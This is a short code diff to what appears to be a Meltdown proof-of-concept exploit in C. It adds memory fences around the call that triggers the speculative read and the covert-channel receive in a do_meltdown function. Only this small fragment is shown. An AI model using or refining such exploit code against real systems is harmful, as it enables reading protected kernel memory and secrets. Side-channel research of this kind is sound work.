@@ -151,11 +151,12 @@ static int do_meltdown(uintptr_t adrs) {
         return -1;
     }
     int ret = -1;
+    my_mfence(); 
     if (sigsetjmp(sig_buf, 1) == 0) {
     // call meltdown
         meltdown(adrs);
     }
-
+    my_mfence(); 
     
     return cc_receive();
 }
